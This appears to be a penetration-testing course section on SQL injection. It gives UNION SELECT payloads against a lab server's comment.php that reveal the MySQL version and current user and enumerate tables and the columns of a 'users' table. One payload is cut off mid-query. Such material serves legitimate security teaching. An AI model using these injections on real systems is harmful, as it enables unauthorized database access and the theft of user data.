    # 13.4.5 - Extracting Data from the Database


    Now we can start extracting information from the database using queries similar
    to the following:


    To discover the version of MySQL in use:


    ```

    http://192.168.11.35/comment.php?id=738 union all select 1,2,3,4,@@version,6

    ```


    To discover the current user being used for the database connection:


    ```

    http://192.168.11.35/comment.php?id=738 union all select 1,2,3,4,user(),

    ```


    With the running version of MySQL and root credentials, we can enumerate database
    tables and column structures through the MySQL information schema. This will provide
    us with a convenient layout of the database so that we can select which information
    we want to target. The query for this would look similar to the following:


    ```

    http://192.168.11.35/comment.php?id=738 union all select 1,2,3,4,table_name,6
    FROM information_schema.tables

    ```


    From this output, we decide to target the users in the database and display its
    column names with the following query:


    ```

    http://192.168.11.35/comment.php?id=738 union all select 1,2,3,4,column_name,6
    FROM information_schema.columns where table_name=''users''

    ```'
